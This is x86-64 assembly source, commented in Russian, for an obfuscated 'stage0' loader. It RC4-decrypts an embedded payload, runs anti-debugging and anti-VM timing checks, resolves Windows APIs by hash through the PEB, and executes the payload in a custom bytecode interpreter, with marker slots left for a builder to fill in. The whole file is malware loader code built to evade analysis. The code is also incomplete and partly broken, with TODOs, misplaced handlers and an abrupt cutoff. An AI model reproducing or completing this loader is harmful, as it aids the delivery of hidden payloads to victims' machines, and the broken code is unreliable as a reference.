; stage0.asm - Минимальный, обфусцированный интерпретатор байткода
; Компиляция: nasm -f bin -o stage0.bin stage0.asm

BITS 64
global _start

_start:
    ; Сохраняем регистры
    push    rbp
    mov     rbp, rsp
    sub     rsp, 0x40 ; Выделяем больше места на стеке для локальных переменных/проверок
    
    ; --- Инициализация стека и регистров VM --- 
    ; (Используем реальный стек процесса, но можно сделать и отдельный)
    mov     r15, rsp ; Указатель стека VM (VM_SP)
    ; Очистим несколько регистров для использования VM
    xor     r14, r14 ; VM_R0 (Регистр общего назначения / результат)
    xor     r13, r13 ; VM_R1
    xor     r12, r12 ; VM_R2
    xor     r11, r11 ; VM_R3
    ; R10 будет указателем на текущую инструкцию байткода (VM_IP)
    lea     r10, [rel bytecode_payload_marker] 
    
    ; --- Расшифровка основного байткода --- 
    ; (Предполагаем, что байткод зашифрован RC4)
    push    r10 ; Сохраняем указатель на байткод
    ; KSA
    lea     rcx, [rel encryption_key_marker] ; Ключ
    mov     rdx, qword [rel key_size_marker] ; Длина ключа
    lea     rdi, [rel s_block]        ; S-блок
    call    rc4_ksa
    ; Crypt
    lea     rcx, [rel s_block]        ; S-блок
    pop     r10 ; Восстанавливаем указатель на (теперь зашифрованный) байткод
    mov     rdx, r10                  ; Входные данные (зашифрованный байткод)
    mov     rdi, r10                  ; Выходные данные (пишем поверх)
    mov     r8, qword [rel bytecode_size_marker] ; Длина байткода
    call    rc4_crypt
    lea     r10, [rel bytecode_payload_marker] ; Снова устанавливаем VM_IP на начало (теперь расшифрованного) байткода
    
    ; --- Анти-отладка: Проверка PEB->BeingDebugged --- 
    mov     rax, qword [gs:0x60]        ; Указатель на PEB
    mov     al, byte [rax + 0x2]        ; PEB->BeingDebugged
    test    al, al
    jnz     exit_program              ; Если дебаггер подключен, выходим
    
    ; --- Анти-отладка: Проверка CheckRemoteDebuggerPresent --- 
    ; (Требует GetProcAddress и вызова самой функции, сделаем позже, после нахождения GetProcAddress)

    ; --- Анти-VM/Песочница: Простая проверка тайминга (разницы между RDTSC) --- 
    ; (Может быть ненадежной, но добавим для примера)
    rdtsc                             ; Получаем начальное время
    mov     qword [rbp-8], rdx
    mov     qword [rbp-16], rax
    ; Какие-то незначительные действия или просто пауза
    mov     rcx, 0xFFFF
delay_loop:
    loop delay_loop
    rdtsc                             ; Получаем конечное время
    sub     rax, qword [rbp-16]       ; Вычитаем младшие части
    sbb     rdx, qword [rbp-8]        ; Вычитаем старшие части с учетом заема
    ; Сравниваем разницу с порогом (очень грубая проверка)
    cmp     rax, 0x50000 ; Порог (подбирается экспериментально)
    jl      exit_program            ; Если времени прошло слишком мало (возможно, VM ускоряет?), выходим
    
    ; --- Анти-отладка: Проверка аппаратных точек останова (DR0-DR7) --- 
    mov     rax, dr7          ; Читаем регистр статуса отладки
    test    rax, 0xFF         ; Проверяем биты L0-L3 и G0-G3 (разрешение точек)
    jz      dr_check_ok       ; Если нули, точки не активны
    ; Если точки разрешены, проверяем адреса
    mov     rax, dr0
    test    rax, rax
    jnz     exit_program      ; Если DR0 != 0, выход
    mov     rax, dr1
    test    rax, rax
    jnz     exit_program      ; Если DR1 != 0, выход
    mov     rax, dr2
    test    rax, rax
    jnz     exit_program      ; Если DR2 != 0, выход
    mov     rax, dr3
    test    rax, rax
    jnz     exit_program      ; Если DR3 != 0, выход
dr_check_ok:
    
    ; --- Основной цикл интерпретатора байткода --- 
vm_loop:
    movzx   eax, byte [r10]   ; Читаем опкод
    inc     r10               ; Переходим к операндам/следующей инструкции

    ; TODO: Расшифровка опкода, если байткод тоже шифруется

    ; Диспетчер инструкций (простой пример через cmp/je)
    cmp     al, 0x01          ; Опкод для PUSH_CONST_QWORD?
    je      handle_push_const_qword
    cmp     al, 0x02          ; Опкод для LOAD_API_HASH?
    je      handle_load_api_hash
    cmp     al, 0x03          ; Опкод для CALL_API (адрес в R0/r14)
    je      handle_call_api_r0
    cmp     al, 0x04          ; Опкод для POP_REG?
    je      handle_pop_reg
    cmp     al, 0x05          ; Опкод для PUSH_REG?
    je      handle_push_reg
    cmp     al, 0x06          ; Опкод для JMP_REG?
    je      handle_jmp_reg
    cmp     al, 0x07          ; Опкод для MOV_REG_CONST?
    je      handle_mov_reg_const
    cmp     al, 0x09          ; Опкод для JZ_REG?
    je      handle_jz_reg
    cmp     al, 0x0A          ; Опкод для XOR_MEM?
    je      handle_xor_mem
    cmp     al, 0x0B          ; Опкод для JNZ_REG?
    je      handle_jnz_reg
    cmp     al, 0x0C          ; Опкод для SYSCALL?
    je      handle_syscall
    cmp     al, 0x10          ; Опкод для MOV_REG_REG?
    je      handle_mov_reg_reg
    cmp     al, 0x11          ; Опкод для MOV_REG_MEM?
    je      handle_mov_reg_mem
    cmp     al, 0x12          ; Опкод для MOV_MEM_REG?
    je      handle_mov_mem_reg
    cmp     al, 0x13          ; Опкод для MOV_REG_MEM_STACK?
    je      handle_mov_reg_mem_stack
    cmp     al, 0x14          ; Опкод для MOV_MEM_STACK_REG?
    je      handle_mov_mem_stack_reg
    cmp     al, 0x20          ; Опкод для ADD_REG_REG?
    je      handle_add_reg_reg
    cmp     al, 0xFF          ; Опкод для HALT?
    je      handle_halt
    cmp     al, 0x21          ; Опкод для SUB_REG_REG?
    je      handle_sub_reg_reg
    cmp     al, 0x22          ; Опкод для XOR_REG_REG?
    je      handle_xor_reg_reg

    ; Неизвестный опкод - аварийный выход?
    ; TODO: Добавить обработку других опкодов
    jmp     exit_program      ; Пока выходим при неизвестном опкоде
    
handle_push_const_qword:
    ; Читаем 8 байт константы из байткода
    mov     rax, qword [r10]
    add     r10, 8            ; Передвигаем VM_IP
    ; Кладем константу в стек VM
    push    rax
    mov     r15, rsp          ; Обновляем VM_SP (если используем реальный стек)
    jmp     vm_loop

handle_load_api_hash:
    ; Читаем 4 байта хеша API из байткода
    mov     edx, dword [r10]  ; edx = Искомый хеш
    add     r10, 4            ; Передвигаем VM_IP

    ; TODO: Определить DLL (пока ищем только в kernel32)
    ; Получаем базу kernel32.dll (как делали раньше)
    push    r10 ; Сохраняем VM_IP
    push    r15 ; Сохраняем VM_SP
    mov     r12, qword [gs:0x60]    ; PEB
    mov     r12, qword [r12 + 0x18] ; Ldr
    mov     r13, qword [r12 + 0x10] ; Flink
    mov     r13, qword [r13]        ; ntdll
    mov     r13, qword [r13]        ; kernel32
    mov     rcx, qword [r13 + 0x30] ; kernel32 base -> rcx для find_function_hash

    call    find_function_hash      ; Ищем функцию по хешу в edx
    mov     r14, rax                ; Сохраняем результат (адрес API или 0) в VM_R0
    pop     r15 ; Восстанавливаем VM_SP
    pop     r10 ; Восстанавливаем VM_IP
    jmp     vm_loop

handle_call_api_r0:
    ; Читаем регистр VM с адресом API (1 байт)
    movzx   rcx, byte [r10]   ; Номер регистра (0=r14, 1=r13, ...)
    ; inc     r10               ; VM_IP++ (инкремент ниже, после чтения количества аргументов)
    ; Читаем количество аргументов (1 байт)
    movzx   rdx, byte [r10]   ; Число аргументов
    add     r10, 2            ; VM_IP += 2 (прочитали регистр и кол-во арг)

    ; Получаем адрес API из регистра VM
    ; TODO: Сделать более гибкую систему регистров VM
    cmp     cl, 0             ; Регистр r14?
    jne     exit_program      ; Ошибка, если не r14 пока
    mov     rdi, r14          ; Адрес API в rdi для вызова

    ; Подготовка стека и регистров для вызова (x64 Windows ABI)
    ; Первые 4 аргумента в RCX, RDX, R8, R9
    ; Остальные на стеке справа налево
    ; Нам нужно снять аргументы с нашего стека VM (r15)
    ; и разместить их правильно. 
    ; Это упрощенная реализация, не учитывает stack shadow space!
    
    ; Сохраняем регистры VM перед вызовом
    push    r10 ; VM_IP
    push    r11 ; VM_R3
    push    r12 ; VM_R2
    push    r13 ; VM_R1
    push    r14 ; VM_R0 (Адрес API)
    push    r15 ; VM_SP

    ; Перемещаем аргументы со стека VM в регистры и на реальный стек
    ; Учитываем shadow space (4 * 8 = 32 байта) + место для аргументов > 4
    mov     r8, rdx           ; Сохраняем количество аргументов в r8
    cmp     dl, 4
    jbe     prepare_args_done ; Если аргументов <= 4, переходим к ним
    
    ; Если аргументов > 4, выделяем место на стеке (выровненное до 16)
    mov     rax, rdx          ; rax = количество аргументов
    sub     rax, 4            ; rax = количество аргументов на стеке
    shl     rax, 3            ; rax = размер в байтах
    add     rax, 8            ; +8 для выравнивания?
    and     spl, 0xF0         ; Выравниваем RSP до 16 байт (может быть не так просто)
    ; TODO: Реализовать правильное выравнивание стека!
    sub     rsp, rax          ; Выделяем место
    mov     r9, rsp           ; r9 - указатель на место для 5-го аргумента
    push    r9                ; Сохраняем указатель на стековую область

    ; Копируем аргументы > 4 со стека VM на реальный стек
    mov     r11, rdx          ; r11 - счетчик аргументов
    sub     r11, 4            ; Количество аргументов на стеке
copy_stack_args:
    mov     rcx, qword [r15 + r11*8 - 8] ; Берем аргумент со стека VM (последний идет первым на реальный стек)
    mov     qword [r9 + r11*8 - 8], rcx ; Копируем на реальный стек
    sub     r11, 1
    jnz     copy_stack_args

    pop     r9                ; Восстанавливаем r9 (не нужно, он 4й аргумент)
    ; Теперь r15 указывает на 4й аргумент в стеке VM

prepare_args_done:
    mov     rdx, r8           ; Восстанавливаем количество аргументов в rdx
    ; Загружаем первые 4 (или меньше) аргумента в регистры
    test    dl, dl
    jz      do_api_call       ; Если 0 аргументов, сразу вызываем
    
    mov     rcx, qword [r15] ; Первый аргумент в RCX
    add     r15, 8
    cmp     dl, 1             ; Сравниваем с ОРИГИНАЛЬНЫМ количеством арг.
    je      do_api_call
    
    mov     rdx, qword [r15] ; Второй аргумент в RDX
    add     r15, 8
    cmp     byte [rsp+0x48], 2 ; Сравниваем сохраненное кол-во арг (r8) с 2.
    ; ПЕРЕДЕЛАТЬ: Сохранить rdx (кол-во арг) перед изменением
    mov     byte [rbp-25], dl ; Сохраняем кол-во арг
    cmp     dl, 2             ; Используем сохраненное значение
    je      do_api_call

    mov     r8, qword [r15]  ; Третий аргумент в R8
    add     r15, 8
    cmp     byte [rbp-25], 3
    je      do_api_call

    mov     r9, qword [r15]  ; Четвертый аргумент в R9
    add     r15, 8

do_api_call:
    ; Выравнивание стека перед вызовом (ABI требует 16 байт)
    ; Выделяем shadow space (32 байта)
    sub     rsp, 0x20
    ; TODO: Реализовать правильное выравнивание
    call    rdi               ; Вызываем API (адрес в rdi)
    
    ; Восстанавливаем регистры VM
    pop     r15 ; VM_SP
    pop     r14 ; VM_R0 (теперь тут результат вызова из RAX)
    mov     r14, rax          ; Сохраняем результат в r14
    pop     r13 ; VM_R1
    pop     r12 ; VM_R2
    pop     r11 ; VM_R3
    pop     r10 ; VM_IP
    
    ; Очищаем стек от аргументов > 4, если они были
    ; TODO: Реализовать очистку стека
    ; mov     rsp, rbp ; Грубая очистка (неверно)
    add     rsp, 0x20 ; Убираем shadow space
    
    jmp     vm_loop

handle_pop_reg:
    ; Читаем номер регистра VM (0=r14, 1=r13, 2=r12, 3=r11)
    movzx   rbx, byte [r10]
    inc     r10               ; VM_IP++
    pop     rax               ; Снимаем значение со стека VM
    mov     r15, rsp          ; Обновляем VM_SP
    ; Сохраняем в нужный регистр VM
    cmp     bl, 0
    je      pop_to_r14
    cmp     bl, 1
    je      pop_to_r13
    cmp     bl, 2
    je      pop_to_r12
    cmp     bl, 3
    je      pop_to_r11
    jmp     vm_loop ; Неизвестный регистр, пока просто продолжаем
pop_to_r14: mov r14, rax; jmp vm_loop
pop_to_r13: mov r13, rax; jmp vm_loop
pop_to_r12: mov r12, rax; jmp vm_loop
pop_to_r11: mov r11, rax; jmp vm_loop

handle_push_reg:
    ; Читаем номер регистра VM
    movzx   rbx, byte [r10]
    inc     r10
    ; Кладем значение из регистра на стек VM
    cmp     bl, 0
    je      push_from_r14
    cmp     bl, 1
    je      push_from_r13
    cmp     bl, 2
    je      push_from_r12
    cmp     bl, 3
    je      push_from_r11
    jmp     vm_loop ; Неизвестный регистр
push_from_r14: push r14; mov r15, rsp; jmp vm_loop
push_from_r13: push r13; mov r15, rsp; jmp vm_loop
push_from_r12: push r12; mov r15, rsp; jmp vm_loop
push_from_r11: push r11; mov r15, rsp; jmp vm_loop

handle_jmp_reg:
    ; Читаем номер регистра VM с адресом для прыжка (1 байт)
    movzx   rbx, byte [r10]
    inc     r10
    ; Прыгаем на адрес в регистре VM
    cmp     bl, 0
    je      jmp_to_r14_vm
    cmp     bl, 1
    je      jmp_to_r13_vm
    cmp     bl, 2
    je      jmp_to_r12_vm
    cmp     bl, 3
    je      jmp_to_r11_vm
    jmp     vm_loop ; Неизвестный регистр, просто продолжаем цикл
jmp_to_r14_vm: jmp r14 ; Непрямой прыжок на адрес в r14
jmp_to_r13_vm: jmp r13 ; Непрямой прыжок на адрес в r13
jmp_to_r12_vm: jmp r12
jmp_to_r11_vm: jmp r11

handle_mov_reg_const:
    ; Читаем номер регистра VM (1 байт)
    movzx   rbx, byte [r10]
    inc     r10
    ; Читаем 64-битную константу
    mov     rax, qword [r10]
    add     r10, 8
    ; Записываем в нужный регистр VM
    cmp     bl, 0
    je      mov_to_r14
    cmp     bl, 1
    je      mov_to_r13
    cmp     bl, 2
    je      mov_to_r12
    cmp     bl, 3
    je      mov_to_r11
    jmp     vm_loop ; Неизвестный регистр
mov_to_r14: mov r14, rax; jmp vm_loop
mov_to_r13: mov r13, rax; jmp vm_loop
mov_to_r12: mov r12, rax; jmp vm_loop
mov_to_r11: mov r11, rax; jmp vm_loop

handle_mov_reg_reg:
    ; Читаем операнды: reg_dst (старшие 4 бита), reg_src (младшие 4 бита)
    movzx   ecx, byte [r10]   ; Байт с номерами регистров
    inc     r10               ; VM_IP++

    ; Определяем исходный регистр (reg_src)
    mov     rbx, rcx          ; Копируем байт операндов
    and     bl, 0x0F          ; Оставляем младшие 4 бита (0-3)
    ; Загружаем значение из исходного регистра в RAX
    cmp     bl, 0
    je      mov_load_r14
    cmp     bl, 1
    je      mov_load_r13
    cmp     bl, 2
    je      mov_load_r12
    cmp     bl, 3
    je      mov_load_r11
    jmp     vm_loop ; Неизвестный исходный регистр
mov_load_r14: mov rax, r14; jmp mov_reg_reg_store
mov_load_r13: mov rax, r13; jmp mov_reg_reg_store
mov_load_r12: mov rax, r12; jmp mov_reg_reg_store
mov_load_r11: mov rax, r11; jmp mov_reg_reg_store

mov_reg_reg_store:
    ; Определяем регистр назначения (reg_dst)
    mov     rbx, rcx          ; Восстанавливаем байт операндов
    shr     bl, 4             ; Сдвигаем старшие 4 бита в младшие
    and     bl, 0x0F          ; Оставляем только их (0-3)
    ; Сохраняем значение из RAX в регистр назначения
    cmp     bl, 0
    je      mov_store_r14
    cmp     bl, 1
    je      mov_store_r13
    cmp     bl, 2
    je      mov_store_r12
    cmp     bl, 3
    je      mov_store_r11
    jmp     vm_loop ; Неизвестный регистр назначения
mov_store_r14: mov r14, rax; jmp vm_loop
mov_store_r13: mov r13, rax; jmp vm_loop
mov_store_r12: mov r12, rax; jmp vm_loop
mov_store_r11: mov r11, rax; jmp vm_loop

handle_mov_reg_mem:
    ; Читаем операнды: reg_dst (старшие 4 бита), reg_addr (младшие 4 бита)
    movzx   ecx, byte [r10]
    inc     r10

    ; Определяем регистр с адресом (reg_addr)
    mov     rbx, rcx
    and     bl, 0x0F
    ; Получаем адрес из регистра в RDI
    cmp     bl, 0
    je      mov_loadaddr_r14
    cmp     bl, 1
    je      mov_loadaddr_r13
    cmp     bl, 2
    je      mov_loadaddr_r12
    cmp     bl, 3
    je      mov_loadaddr_r11
    jmp     vm_loop ; Неизвестный регистр адреса
mov_loadaddr_r14: mov rdi, r14; jmp mov_reg_mem_read
mov_loadaddr_r13: mov rdi, r13; jmp mov_reg_mem_read
mov_loadaddr_r12: mov rdi, r12; jmp mov_reg_mem_read
mov_loadaddr_r11: mov rdi, r11; jmp mov_reg_mem_read

mov_reg_mem_read:
    ; Читаем QWORD из памяти по адресу в RDI
    ; TODO: Добавить обработку ошибок доступа к памяти?
    mov     rax, qword [rdi]

    ; Определяем регистр назначения (reg_dst)
    mov     rbx, rcx
    shr     bl, 4
    and     bl, 0x0F
    ; Сохраняем прочитанное значение в регистр назначения
    cmp     bl, 0
    je      mov_mem_store_r14
    cmp     bl, 1
    je      mov_mem_store_r13
    cmp     bl, 2
    je      mov_mem_store_r12
    cmp     bl, 3
    je      mov_mem_store_r11
    jmp     vm_loop ; Неизвестный регистр назначения
mov_mem_store_r14: mov r14, rax; jmp vm_loop
mov_mem_store_r13: mov r13, rax; jmp vm_loop
mov_mem_store_r12: mov r12, rax; jmp vm_loop
mov_mem_store_r11: mov r11, rax; jmp vm_loop

handle_mov_mem_reg:
    ; Читаем операнды: reg_src (старшие 4 бита), reg_addr (младшие 4 бита)
    movzx   ecx, byte [r10]
    inc     r10

    ; Определяем регистр с адресом (reg_addr)
    mov     rbx, rcx
    and     bl, 0x0F
    ; Получаем адрес из регистра в RDI (куда писать)
    cmp     bl, 0
    je      mov_storeaddr_r14
    cmp     bl, 1
    je      mov_storeaddr_r13
    cmp     bl, 2
    je      mov_storeaddr_r12
    cmp     bl, 3
    je      mov_storeaddr_r11
    jmp     vm_loop ; Неизвестный регистр адреса
mov_storeaddr_r14: mov rdi, r14; jmp mov_mem_reg_load_src
mov_storeaddr_r13: mov rdi, r13; jmp mov_mem_reg_load_src
mov_storeaddr_r12: mov rdi, r12; jmp mov_mem_reg_load_src
mov_storeaddr_r11: mov rdi, r11; jmp mov_mem_reg_load_src

mov_mem_reg_load_src:
    ; Определяем регистр-источник (reg_src)
    mov     rbx, rcx
    shr     bl, 4
    and     bl, 0x0F
    ; Загружаем значение из регистра-источника в RAX (что писать)
    cmp     bl, 0
    je      mov_loadsrc_r14
    cmp     bl, 1
    je      mov_loadsrc_r13
    cmp     bl, 2
    je      mov_loadsrc_r12
    cmp     bl, 3
    je      mov_loadsrc_r11
    jmp     vm_loop ; Неизвестный регистр-источник
mov_loadsrc_r14: mov rax, r14; jmp mov_mem_reg_write
mov_loadsrc_r13: mov rax, r13; jmp mov_mem_reg_write
mov_loadsrc_r12: mov rax, r12; jmp mov_mem_reg_write
mov_loadsrc_r11: mov rax, r11; jmp mov_mem_reg_write

mov_mem_reg_write:
    ; Записываем значение из RAX в память по адресу в RDI
    ; TODO: Добавить обработку ошибок доступа к памяти?
    mov     qword [rdi], rax
    jmp     vm_loop

handle_jz_reg: ; Jump if Zero (based on VM_R0/r14)
    ; Читаем номер регистра VM с адресом для прыжка (1 байт)
    movzx   rbx, byte [r10]
    inc     r10
    ; Проверяем VM_R0 (r14) на ноль
    test    r14, r14
    jnz     vm_loop ; Если не ноль, просто продолжаем
    
    ; Если ноль, прыгаем на адрес в указанном регистре
    cmp     bl, 0
    je      jz_to_r14
    cmp     bl, 1
    je      jz_to_r13
    cmp     bl, 2
    je      jz_to_r12
    cmp     bl, 3
    je      jz_to_r11
    jmp     vm_loop ; Неизвестный регистр, просто продолжаем цикл
jz_to_r14: jmp r14 ; Непрямой прыжок
jz_to_r13: jmp r13
jz_to_r12: jmp r12
jz_to_r11: jmp r11

handle_jnz_reg: ; Jump if Not Zero (based on VM_R0/r14)
    ; Читаем номер регистра VM с адресом для прыжка (1 байт)
    movzx   rbx, byte [r10]
    inc     r10
    ; Проверяем VM_R0 (r14) на ноль
    test    r14, r14
    jz      vm_loop ; Если ноль, просто продолжаем

    ; Если не ноль, прыгаем на адрес в указанном регистре
    cmp     bl, 0
    je      jnz_to_r14
    cmp     bl, 1
    je      jnz_to_r13
    cmp     bl, 2
    je      jnz_to_r12
    cmp     bl, 3
    je      jnz_to_r11
    jmp     vm_loop ; Неизвестный регистр, просто продолжаем цикл
jnz_to_r14: jmp r14 ; Непрямой прыжок
jnz_to_r13: jmp r13
jnz_to_r12: jmp r12
jnz_to_r11: jmp r11

handle_xor_mem:
    ; Снимаем аргументы со стека VM (адрес данных, размер, ключ)
    pop     r8                ; R8 = Ключ (пока qword)
    pop     rdx               ; RDX = Размер
    pop     rcx               ; RCX = Адрес данных
    mov     r15, rsp          ; Обновляем VM_SP

    ; Простой XOR цикл
    xor     rbx, rbx          ; Счетчик i = 0
xor_mem_loop:
    mov     al, byte [rcx + rbx] ; Байт данных
    xor     al, r8b           ; XOR с младшим байтом ключа (упрощение!)
    mov     byte [rcx + rbx], al ; Записываем обратно
    inc     rbx
    cmp     rbx, rdx
    jb      xor_mem_loop

    ; Результат операции (например, 0 = успех) в R0/r14
    xor     r14, r14
    jmp     vm_loop

handle_halt:
    jmp     exit_program      ; Просто выходим
    
    ; Завершаем работу
exit_program:
    ; TODO: Безопасное завершение? (напр. ExitProcess(0))
    ; Пока просто выходим
    add     rsp, 0x40
    pop     rbp
    ret

; Функция поиска адреса API по хешу (восстановлена)
find_function_hash:
    push    rbp
    mov     rbp, rsp
    push    rbx
    push    rdi
    
    ; rcx = базовый адрес DLL, edx = хеш функции
    
    ; Получаем DOS-заголовок
    mov     rbx, rcx
    
    ; Получаем NT-заголовок
    mov     eax, dword [rbx + 0x3C]   ; e_lfanew
    add     rax, rbx                  ; RVA -> VA
    
    ; Получаем таблицу экспорта
    mov     eax, dword [rax + 0x88]   ; OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
    add     rax, rbx                  ; RVA -> VA
    
    ; Получаем адреса таблиц
    mov     ecx, dword [rax + 0x1C]   ; Export Address Table RVA
    add     rcx, rbx                  ; RVA -> VA
    mov     r10, rcx                  ; Сохраняем EAT
    
    mov     ecx, dword [rax + 0x20]   ; Name Pointer Table RVA
    add     rcx, rbx                  ; RVA -> VA
    mov     r11, rcx                  ; Сохраняем NPT
    
    mov     ecx, dword [rax + 0x24]   ; Ordinal Table RVA
    add     rcx, rbx                  ; RVA -> VA
    mov     r12, rcx                  ; Сохраняем OT
    
    mov     ecx, dword [rax + 0x14]   ; NumberOfFunctions
    xor     rdi, rdi
    
find_loop:
    push    rcx                      ; Сохраняем счетчик
    
    ; Получаем имя функции
    mov     ecx, dword [r11 + rdi*4]  ; Получаем RVA имени функции
    add     rcx, rbx                  ; RVA -> VA
    
    ; Вычисляем хеш имени
    call    calc_hash
    
    ; Сравниваем с искомым хешем
    cmp     eax, edx
    je      found_function
    
    ; Если не совпало, идем к следующей функции
    inc     rdi
    pop     rcx
    loop    find_loop
    
    ; Функция не найдена
    xor     rax, rax
    jmp     exit_find
    
found_function:
    ; Найдена функция, получаем ее адрес
    mov     cx, word [r12 + rdi*2]    ; Порядковый номер
    mov     eax, dword [r10 + rcx*4]  ; RVA функции
    add     rax, rbx                  ; RVA -> VA
    
exit_find:
    pop     rcx                       ; Восстанавливаем счетчик
    pop     rdi
    pop     rbx
    pop     rbp
    ret

; Вычисление хеша имени функции (восстановлена)
calc_hash:
    push    rbp
    mov     rbp, rsp
    
    xor     eax, eax                  ; Исходный хеш = 0
    
hash_loop:
    movzx   edx, byte [rcx]           ; Берем байт из имени
    test    dl, dl
    jz      hash_done                 ; Если 0, имя закончилось
    
    ; Обновляем хеш (простая функция ROR13 + XOR)
    or      dl, 0x20                  ; Приводим к нижнему регистру
    ror     eax, 13
    add     eax, edx
    
    inc     rcx
    jmp     hash_loop
    
hash_done:
    pop     rbp
    ret

; --- Реализация RC4 --- 

; rc4_ksa - Инициализация S-блока (Key Scheduling Algorithm)
; Вход:
;   rcx: адрес ключа
;   rdx: длина ключа (байт)
;   rdi: адрес S-блока (256 байт)
rc4_ksa:
    push    rsi
    push    rbx
    xor     rbx, rbx          ; i = 0
ksa_init_loop:
    mov     byte [rdi+rbx], bl ; S[i] = i
    inc     rbx
    cmp     rbx, 256
    jne     ksa_init_loop

    xor     rbx, rbx          ; i = 0
    xor     rax, rax          ; j = 0
ksa_permute_loop:
    push    rdx ; Сохраняем оригинальный rdx (длина ключа)
    push    rax ; Сохраняем j
    mov     rax, rbx ; Делимое i в RAX
    xor     rdx, rdx ; Очищаем RDX для DIV
    mov     r10, qword [rsp+16] ; Берем длину ключа (сохраненный rdx) в r10
    div     r10 ; RAX = i / keylen, RDX = i % keylen
    mov     r10, rdx ; r10 = i % keylen
    pop     rax ; Восстанавливаем j
    pop     rdx ; Восстанавливаем оригинальный rdx (длина ключа)
    ; Теперь r10 содержит i % keylen
    movzx   r9, byte [rcx + r10]      ; key[i % keylen]

    movzx   r10, byte [rdi + rbx]      ; S[i]
    add     rax, r9           ; j = (j + key[i % keylen]) % 256
    add     rax, r10          ; j = (j + key[i % keylen] + S[i]) % 256

    ; swap(S[i], S[j])
    mov     r10b, byte [rdi + rax] ; temp = S[j]
    mov     r11b, byte [rdi + rbx] ; S[j] = S[i]
    mov     byte [rdi + rax], r11b
    mov     byte [rdi + rbx], r10b ; S[i] = temp

    inc     rbx
    cmp     rbx, 256
    jne     ksa_permute_loop

    pop     rsi
    pop     rbx
    ret

; rc4_crypt - Шифрование/расшифровка данных
; Вход:
;   rcx: адрес S-блока (инициализированного)
;   rdx: адрес входных данных (шифруемых/расшифровываемых)
;   rdi: адрес выходного буфера
;   r8: длина данных (байт)
; Выход: данные в [rdi]
; Использует/портит: rax, rbx, r9, r10, r11
rc4_crypt:
    push    rsi
    mov     rsi, rcx          ; rsi = S-блок
    xor     rax, rax          ; i = 0
    xor     rbx, rbx          ; j = 0

crypt_loop:
    inc     al                ; i = (i + 1) % 256
    movzx   r9, byte [rsi + rax] ; S[i]
    add     bl, r9b           ; j = (j + S[i]) % 256
    
    ; swap(S[i], S[j])
    mov     r10b, byte [rsi + rbx] ; temp = S[j]
    mov     byte [rsi + rbx], r9b  ; S[j] = S[i]
    mov     byte [rsi + rax], r10b ; S[i] = temp
    
    ; k = S[(S[i] + S[j]) % 256]
    add     r9b, r10b         ; S[i] + S[j] (результат в r9b)
    movzx   r11, byte [rsi + r9] ; k = S[S[i]+S[j]]
    
    ; XOR с байтом данных
    movzx   r9, byte [rdx]    ; Берем байт из входных данных
    xor     r11b, r9b         ; XOR с ключевым байтом k
    mov     byte [rdi], r11b  ; Сохраняем результат в выходной буфер
    
    inc     rdx               ; Следующий байт входных данных
    inc     rdi               ; Следующий байт выходного буфера
    dec     r8                ; Уменьшаем счетчик длины
    jnz     crypt_loop
    
    pop     rsi
    ret

; Данные
align 8
str_advapi32:
    db 'advapi32.dll', 0

; --- Маркеры для билдера --- 
; Билдер будет искать эти маркеры в бинарном файле и заменять их
; на реальные значения.
key_size_marker:
    dq 0xDEADBEEFCAFEBABE ; Маркер для размера ключа (будет заменен на qword с размером)

encryption_key_marker:
    times 16 db 0xAA       ; Маркер для ключа (16 байт, будет заменен реальным ключом)

; Размер полезной нагрузки
section .bss align=16 ; Выравнивание для S-блока
    ; S-блок для RC4 (256 байт в .bss, чтобы не увеличивать размер .text)
    s_block: resb 256

section .data
; --- Маркеры для билдера --- 
bytecode_size_marker:
    dq 0xFEEDFACEBABEF00D ; Маркер для размера байткода (будет заменен qword с размером)

; Байткод полезной нагрузки (будет заполнен билдером)
bytecode_payload_marker:
    dq 0xDEADC0DEBAADC0DE ; Маркер начала байткода
bytecode_payload_data:
    resb 8192              ; Место для вставки байткода (8KB)

handle_add_reg_reg: ; ADD R_dst, R_src
    ; Читаем операнды: reg_dst (старшие 4 бита), reg_src (младшие 4 бита)
    movzx   ecx, byte [r10]
    inc     r10

    ; Определяем исходный регистр (reg_src)
    mov     rbx, rcx
    and     bl, 0x0F
    ; Загружаем значение из исходного регистра в RAX
    cmp     bl, 0
    je      add_load_r14
    cmp     bl, 1
    je      add_load_r13
    cmp     bl, 2
    je      add_load_r12
    cmp     bl, 3
    je      add_load_r11
    jmp     vm_loop ; Неизвестный исходный регистр
add_load_r14: mov rax, r14; jmp add_reg_reg_op
add_load_r13: mov rax, r13; jmp add_reg_reg_op
add_load_r12: mov rax, r12; jmp add_reg_reg_op
add_load_r11: mov rax, r11; jmp add_reg_reg_op

add_reg_reg_op:
    ; Определяем регистр назначения (reg_dst) и выполняем сложение
    mov     rbx, rcx
    shr     bl, 4
    and     bl, 0x0F
    cmp     bl, 0
    je      add_store_r14
    cmp     bl, 1
    je      add_store_r13
    cmp     bl, 2
    je      add_store_r12
    cmp     bl, 3
    je      add_store_r11
    jmp     vm_loop ; Неизвестный регистр назначения
add_store_r14: add r14, rax; jmp vm_loop
add_store_r13: add r13, rax; jmp vm_loop
add_store_r12: add r12, rax; jmp vm_loop
add_store_r11: add r11, rax; jmp vm_loop

handle_sub_reg_reg: ; SUB R_dst, R_src
    ; Читаем операнды: reg_dst (старшие 4 бита), reg_src (младшие 4 бита)
    movzx   ecx, byte [r10]
    inc     r10

    ; Определяем исходный регистр (reg_src)
    mov     rbx, rcx
    and     bl, 0x0F
    ; Загружаем значение из исходного регистра в RAX
    cmp     bl, 0
    je      sub_load_r14
    cmp     bl, 1
    je      sub_load_r13
    cmp     bl, 2
    je      sub_load_r12
    cmp     bl, 3
    je      sub_load_r11
    jmp     vm_loop
sub_load_r14: mov rax, r14; jmp sub_reg_reg_op
sub_load_r13: mov rax, r13; jmp sub_reg_reg_op
sub_load_r12: mov rax, r12; jmp sub_reg_reg_op
sub_load_r11: mov rax, r11; jmp sub_reg_reg_op

sub_reg_reg_op:
    ; Определяем регистр назначения (reg_dst) и выполняем вычитание
    mov     rbx, rcx
    shr     bl, 4
    and     bl, 0x0F
    cmp     bl, 0
    je      sub_store_r14
    cmp     bl, 1
    je      sub_store_r13
    cmp     bl, 2
    je      sub_store_r12
    cmp     bl, 3
    je      sub_store_r11
    jmp     vm_loop
sub_store_r14: sub r14, rax; jmp vm_loop
sub_store_r13: sub r13, rax; jmp vm_loop
sub_store_r12: sub r12, rax; jmp vm_loop
sub_store_r11: sub r11, rax; jmp vm_loop

handle_xor_reg_reg: ; XOR R_dst, R_src
    ; Читаем операнды: reg_dst (старшие 4 бита), reg_src (младшие 4 бита)
